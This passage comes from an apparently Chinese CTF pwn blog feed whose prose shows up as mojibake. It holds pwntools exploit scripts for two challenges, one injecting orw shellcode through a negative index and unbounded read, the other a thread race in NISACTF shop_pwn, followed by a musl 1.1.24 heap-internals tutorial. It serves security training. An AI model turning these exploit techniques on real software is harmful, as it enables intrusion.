class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>checksec ä¸€ä¸‹ï¼Œå‘ç° got è¡¨å¯å†™ï¼Œä¸”æœ‰ rwx ç©ºé—´ï¼Œå †æ ˆå‡å¯ rwxï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261649622.png" alt="image-20230926164914818" style="zoom:50%;" /><p>å‘ç°æ˜¯ä¸ªä¼ªèœå•é¢˜ï¼Œidx å¯ä»¥ä¸ºè´Ÿæ•°ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261652158.png" alt="image-20230926165223111" style="zoom:50%;" /><p>size æ˜¯ä¸ªæœ‰ç¬¦å· int å‹ï¼Œåœ¨ read_ ä¸­æœ‰ä¸ªæ¼æ´ï¼Œå‡å¦‚ size ä¸º 0ï¼Œç¨‹åºä¼šä¸€ç›´è¯»ä¸‹å»ï¼Œç›´è‡³ä¸º \nï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309261658413.png" alt="image-20230926165839366" style="zoom:50%;" /><p>EXP å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x67616c66</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,1024</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,rax</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rax,60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice &gt;&gt;\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;index:\n&quot;</span>, <span class="string">b&quot;-25&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;size:\n&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;content:\n&quot;</span>, shellcode)</span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *$rebase(0xFE7)&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;choice &gt;&gt;\n&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;index:\n&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><h2 id="1-NISACTF-2022-shop-pwn"><a href="#1-NISACTF-2022-shop-pwn" class="headerlink" title="1. [NISACTF 2022]shop_pwn"></a>1. [NISACTF 2022]shop_pwn</h2><p>åˆšå¼€å§‹åªæœ‰ 100 å…ƒï¼Œè´­ä¹° flag éœ€è¦ 200 å…ƒï¼Œbags ä¸­åªæœ‰ä¸€æ”¯å€¼ 99 å…ƒçš„ penï¼Œå–æ‰ä¹Ÿä¸å¤Ÿ flag çš„é’±ã€‚</p><p>ä½†å€¼å¾—ä¸€æçš„æ˜¯å–ä¸œè¥¿çš„ç¨‹åºæ˜¯ç”±<code>pthread_create</code>åˆ›é€ çš„çº¿ç¨‹å»æ‰§è¡Œï¼Œä¸”æ‰§è¡Œè¿‡ç¨‹ä¸­ä½¿ç”¨äº†<code>usleep</code>çŸ­æš‚åœ°ä¼‘çœ äº†ï¼Œå› æ­¤å¯èƒ½å­˜åœ¨å¤šçº¿ç¨‹ç«äº‰é—®é¢˜ï¼Œå³ä¸¤ä¸ªçº¿ç¨‹åœ¨å¾ˆå°çš„æ—¶é—´é—´éš™å†…åŒæ—¶å–æ‰äº†ç¬”ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309141558070.png" alt="image-20230914155829851" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309141559592.png" alt="image-20230914155930453" style="zoom:50%;" /><p>EXP å¦‚ä¸‹ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ sleep æ¯”è¾ƒçŸ­çš„æƒ…å†µä¸‹æ‰“è¿œç¨‹æœ€å¥½ä¸è¦ç”¨<code>sendafter</code>ã€<code>sendlineafter</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>, <span class="number">28913</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sell_pen</span>():</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy_flag</span>():</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_flag</span>():</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">sell_pen()</span><br><span class="line">sell_pen()</span><br><span class="line"></span><br><span class="line">buy_flag()</span><br><span class="line">see_flag()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¤ç›˜ã€è®°å½•è¿‘æœŸä¸€äº›æ¯”èµ›çš„ wpã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>musl_pwn</title>
    <link href="http://example.com/2023/09/03/musl-pwn/"/>
    <id>http://example.com/2023/09/03/musl-pwn/</id>
    <published>2023-09-03T04:32:26.000Z</published>
    <updated>2023-09-26T10:44:00.253Z</updated>
    
    <content type="html"><![CDATA[<p>é™¤äº†å­¦ä¹  glibc çš„å †ç®¡ç†æœºåˆ¶å¤–ï¼Œmusl ä¹Ÿå¼€å§‹æä¸Šè¡Œç¨‹ã€‚</p><p>ç”±äºä»¥å‰æ€»æ˜¯ç”¨æ¨¡æ¿æ€è·¯åšé¢˜ï¼Œå¾ˆå¤šä¸œè¥¿æ€»æ˜¯æµ®äºè¡¨é¢ï¼Œä¸èƒ½å¾ˆå¥½åœ°ç³»ç»Ÿæ€§ç†è§£ã€‚å› æ­¤æœ‰äº†å›ç‚‰é‡é€ çš„æƒ³æ³•ï¼Œå¸Œæœ›èƒ½ä»æ ¹æœ¬ä¸Šç†è§£å †ç®¡ç†çš„æœºåˆ¶ã€‚</p><span id="more"></span><h2 id="1-Muslç®€è¿°"><a href="#1-Muslç®€è¿°" class="headerlink" title="1 Muslç®€è¿°"></a>1 Muslç®€è¿°</h2><p>â€‹    musl libc æ˜¯ä¸€ä¸ªä¸“é—¨ä¸ºåµŒå…¥å¼ç³»ç»Ÿå¼€å‘çš„è½»é‡çº§ libc åº“ï¼Œä»¥ç®€å•ã€è½»é‡å’Œé«˜æ•ˆç‡ä¸ºç‰¹è‰²ã€‚æœ‰ä¸å°‘ Linux å‘è¡Œç‰ˆå°†å…¶è®¾ä¸ºé»˜è®¤çš„ libc åº“ï¼Œç”¨æ¥ä»£æ›¿ä½“ç§¯è‡ƒè‚¿çš„ glibc ï¼Œå¦‚ <a href="https://zh.wikipedia.org/zh-cn/Alpine_Linux">Alpine Linux</a>ï¼ˆåšè¿‡ Docker é•œåƒçš„åº”è¯¥å¾ˆç†Ÿæ‚‰ï¼‰ã€<a href="https://zh.wikipedia.org/wiki/OpenWrt">OpenWrt</a>ï¼ˆå¸¸ç”¨äºè·¯ç”±å™¨ï¼‰å’Œ Gentoo ç­‰ã€‚</p><p>â€‹    musl libc å †ç®¡ç†å™¨çº¦ç­‰åŒäº dlmallocï¼ˆglibc å †ç®¡ç†å™¨ ptmalloc2 çš„å‰èº«ï¼‰ï¼Œå› æ­¤æŸäº›éƒ¨åˆ†å¦‚ chunkã€unbin ä¸ glibc ååˆ†ç›¸ä¼¼ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">æºç ä¸‹è½½è·¯å¾„ï¼š</span><br><span class="line">https://git.musl-libc.org/cgit/musl</span><br><span class="line"></span><br><span class="line">ç¼–è¯‘å‘½ä»¤ï¼ˆä»¥1.1.24ä¸ºä¾‹ï¼‰ï¼š</span><br><span class="line">tar -xzvf musl-1.1.24.tar.gz</span><br><span class="line"><span class="built_in">cd</span> musl-1.1.24</span><br><span class="line">sudo su</span><br><span class="line">./configure --prefix=/usr/local/musl CFLAGS=<span class="string">&#x27;-O2 -v&#x27;</span> --enable-debug=<span class="built_in">yes</span></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">ç¼–è¯‘å®Œæˆåï¼Œå¯åœ¨ /usr/lib/musl/lib ç›®å½•ä¸‹æ‰¾åˆ° libc.so</span><br></pre></td></tr></table></figure><h2 id="2-Musl-1-1-24"><a href="#2-Musl-1-1-24" class="headerlink" title="2 Musl 1.1.24"></a>2 Musl 1.1.24</h2><p><code>malloc</code>å’Œ<code>free</code>çš„æºç å¯ä»¥åœ¨<code>src/malloc/malloc.c</code>ä¸­æŸ¥çœ‹ï¼Œéƒ¨åˆ†ç»“æ„ä½“å’Œå®å®šä¹‰ä½äº<code>src/internal/malloc_impl.h</code>ã€‚</p><h3 id="2-1-æ•°æ®ç»“æ„"><a href="#2-1-æ•°æ®ç»“æ„" class="headerlink" title="2-1 æ•°æ®ç»“æ„"></a>2-1 æ•°æ®ç»“æ„</h3><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">        <span class="type">size_t</span> psize, csize;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031304719.png" alt="image-20230903130448645" style="zoom: 67%;" /><p>â€‹    chunk çš„ç»“æ„å¦‚ä¸Šï¼Œæœ‰ç‚¹ç±»ä¼¼äº glibc ï¼Œä½† chunk ä¹‹é—´ä¸é‡ç”¨ psizeï¼Œä¹Ÿå°±æ˜¯è¯´é™¤äº†æº¢å‡ºä¹‹å¤–ï¼Œä¸èƒ½é€šè¿‡ä¸Šä¸€ä¸ª chunk æ¥ä¿®æ”¹ä¸‹ä¸€ä¸ª chunk çš„ psize ä½ã€‚</p><p>â€‹    psize å’Œ csize éƒ½åªæœ‰ä¸€ç§ä½äºæœ€ä½ä½çš„æ ‡å¿—ä½ <strong>INUSE</strong>ï¼ˆglibcåˆ™æœ‰ä¸‰ç§ï¼‰ï¼ŒINUSE ä½ä¸º 1 è¯´æ˜ chunk æ­£åœ¨è¢«ä½¿ç”¨ï¼Œè‹¥ä¸º 0 åˆ™è¯´æ˜ chunk å·²è¢«é‡Šæ”¾æˆ–è€…é€šè¿‡ mmap åˆ†é…ï¼Œéœ€è¦ psize çš„æ ‡å¿—ä½è¿›è¡Œè¿›ä¸€æ­¥åˆ¤æ–­ã€‚</p><h4 id="mal-amp-bin"><a href="#mal-amp-bin" class="headerlink" title="mal &amp; bin"></a>mal &amp; bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="type">uint64_t</span> binmap;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="type">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure><p>â€‹    mal çš„ç»“æ„ä½“è®°å½•ç€å †çš„çŠ¶æ€ï¼Œæœ‰ä¸‰ä¸ªæˆå‘˜ï¼š64ä½æ— ç¬¦å·æ•´æ•° binmapã€é“¾è¡¨å¤´éƒ¨æ•°ç»„ binsã€é” free_lockã€‚å…¶ä¸­ binmap è®°å½•æ¯ä¸ª chunk æ˜¯å¦ä¸ºç©ºï¼Œè‹¥æŸä¸ªæ¯”ç‰¹ä½ä¸º 1ï¼Œè¡¨ç¤ºå¯¹åº”çš„ bin ä¸ºéç©ºï¼Œå³ bin é“¾è¡¨ä¸­æœ‰ chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031404599.png" alt="image-20230903140424558" style="zoom: 80%;" /><p>â€‹    bin çš„ç»“æ„ä½“å¦‚ä¸Šã€‚head å’Œ tail æŒ‡é’ˆåˆ†åˆ«æŒ‡å‘å¤´éƒ¨å’Œå°¾éƒ¨çš„ chunkï¼ŒåŒæ—¶é¦–éƒ¨ chunk çš„ prev æŒ‡é’ˆå’Œå°¾éƒ¨ chunk çš„ next æŒ‡é’ˆæŒ‡å‘äº† bin é“¾è¡¨çš„å¤´éƒ¨ï¼Œæ„æˆäº†å¾ªç¯é“¾è¡¨ã€‚è‹¥é“¾è¡¨ä¸ºç©ºï¼Œhead å’Œ tail ä¸º 0 æˆ–è€…æŒ‡å‘é“¾è¡¨å¤´éƒ¨è‡ªèº«ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309031407062.png" alt="image-20230903140736882" style="zoom:80%;" /><p>â€‹    ä»¥ä¸Šä¸ºæ¯ä¸ª bin çš„ chunk å¤§å°èŒƒå›´ï¼Œå‰ 32 ä¸ª bin ç±»ä¼¼äº fastbin å’Œ smallbinï¼Œæ¯ä¸ª bin åªå¯¹åº”äºä¸€ç§å¤§å°çš„ chunkï¼›å 32 ä¸ª bin ç±»ä¼¼äº large binï¼Œä¸€ä¸ª bin å¯¹åº”äºå¤šç§å¤§å°çš„ chunkï¼Œä¾‹å¦‚ bin ä¸‹æ ‡ä¸º 34 æ—¶ï¼Œè®¡ç®—å¾—çŸ¥ chunk å¤§å°ä¸º 0x620~0x700ï¼Œå³å¯ä»¥å®¹çº³ 0x620ã€0x640ã€0x660ã€0x680ã€0x6a0ã€0x6c0ã€0x6e0ã€0x700ï¼ˆ0x20 é€’å¢ï¼‰å¤§å°çš„ chunkã€‚</p><h3 id="2-2-malloc-å®ç°"><a href="#2-2-malloc-å®ç°" class="headerlink" title="2-2 malloc å®ç°"></a>2-2 malloc å®ç°</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">        <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *n = (*n + OVERHEAD + SIZE_ALIGN - 1) &amp; SIZE_MASK;</span></span><br><span class="line">    <span class="comment">// 1. n å¢åŠ å¤´éƒ¨é•¿åº¦ï¼Œå¹¶å¯¹é½ 32 ä½</span></span><br><span class="line">        <span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœ n åˆ°è¾¾äº† mmap çš„é—¨æ§›ï¼ˆ0x38000ï¼‰ï¼Œåˆ™ä½¿ç”¨ mmap æ¥ç”³è¯· chunk</span></span><br><span class="line">        <span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">                <span class="type">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">                <span class="type">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ|PROT_WRITE,</span><br><span class="line">                        MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (base == (<span class="type">void</span> *)<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                c = (<span class="type">void</span> *)(base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">                c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">                c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">                <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 2. å¯»æ‰¾ n å¤§å°å¯¹åº”çš„ bin ä¸‹æ ‡</span></span><br><span class="line">        i = bin_index_up(n);</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="comment">// 3. æŸ¥æ‰¾ binmap</span></span><br><span class="line">                <span class="type">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">                <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">                    <span class="comment">// è‹¥æ‰€æœ‰å¯ç”¨ bin ä¸ºç©ºï¼Œåˆ™è°ƒç”¨ expand_heap å‡½æ•°ç”Ÿæˆæ–°çš„ chunk</span></span><br><span class="line">                        c = expand_heap(n);</span><br><span class="line">                        <span class="keyword">if</span> (!c) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">if</span> (alloc_rev(c)) &#123;</span><br><span class="line">                                <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">x</span> =</span> c;</span><br><span class="line">                                c = PREV_CHUNK(c);</span><br><span class="line">                                NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =</span><br><span class="line">                                        x-&gt;csize + CHUNK_SIZE(c);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="comment">// 4. è·å–å¤§å°æœ€æ¥è¿‘ n çš„å¯ç”¨ bin ä¸‹æ ‡ j</span></span><br><span class="line">                j = first_set(mask);</span><br><span class="line">                lock_bin(j);</span><br><span class="line">            <span class="comment">// 5. è·å–ä¸‹æ ‡ä¸º j çš„ bin çš„é¦–éƒ¨</span></span><br><span class="line">                c = mal.bins[j].head;</span><br><span class="line">            <span class="comment">// 6. è‹¥ç¬¦åˆæ¡ä»¶ï¼Œåˆ™ä½¿ç”¨ pretrim åˆ†å‰² cï¼Œå¦åˆ™ç”¨ unbin ä»é“¾è¡¨ä¸­å–å‡º c</span></span><br><span class="line">                <span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">                        unlock_bin(j);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                unlock_bin(j);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 7. å›æ”¶ c ä¸­å¤§å°è¶…è¿‡ n çš„éƒ¨åˆ†</span></span><br><span class="line">        <span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">        trim(c, n);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    malloc ä¸»è¦æ­¥éª¤æ˜¯é€šè¿‡ binmap é€‰æ‹© binï¼Œç„¶åå–å‡º bin é¦–éƒ¨çš„ chunkï¼Œä¸”å–å‡ºè¿‡ç¨‹æ²¡æœ‰ä»»ä½•å¯¹é“¾è¡¨å’Œ chunk å¤´éƒ¨çš„æ£€æµ‹ã€‚è¯¦ç»†æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å¯¹ç”¨æˆ·ç”³è¯·çš„å¤§å° n è¿›è¡Œè°ƒæ•´ï¼Œå¢åŠ å¤´éƒ¨é•¿åº¦å¹¶ä¸ 32 ä½å¯¹é½ã€‚</li><li>å¦‚æœ n è¾¾åˆ° mmap çš„å¤§å°ï¼Œåˆ™ä½¿ç”¨ mmap è¿”å›å†…å­˜ç»™ç”¨æˆ·ï¼Œå¦åˆ™è®¡ç®— n å¯¹åº” bin ä¸‹æ ‡ iï¼ŒæŸ¥æ‰¾ binmapã€‚</li><li>å¦‚æœæ‰€æœ‰å¯ç”¨çš„ bin ä¸ºç©ºï¼Œåˆ™ç”Ÿæˆä¸€ä¸ªæ–°çš„ chunkï¼Œå¦åˆ™é€‰æ‹©å¤§å°æœ€æ¥è¿‘çš„ binï¼Œè·å–å…¶é¦–éƒ¨çš„ chunk cã€‚</li><li>å¦‚æœ c ç¬¦åˆ pretrim æ¡ä»¶ï¼Œåˆ™ä½¿ç”¨ pretrim è¿›è¡Œåˆ‡å‰²ï¼Œå¦åˆ™ä½¿ç”¨ unbin ä»é“¾è¡¨ä¸­å–å‡º cã€‚</li><li>æœ€åå¯¹ chunk è¿›è¡Œ trimï¼Œè¿”å›ç»™ç”¨æˆ·ã€‚</li></ol><p>â€‹    éœ€è¦ç®€å•äº†è§£ä¸€ä¸‹ unbinã€pretrim å’Œ trimã€‚</p><h4 id="unbin"><a href="#unbin" class="headerlink" title="unbin"></a>unbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// è‹¥ bin ä¸­åªæœ‰ä¸€ä¸ª chunk cï¼Œå°† bin è®¾ç½®ä¸ºç©º bin</span></span><br><span class="line"><span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line"><span class="comment">// å–å‡ºé“¾è¡¨ä¸­çš„ chunk</span></span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">// è®¾ç½® INUSE ä½</span></span><br><span class="line">c-&gt;csize |= C_INUSE;</span><br><span class="line">NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span 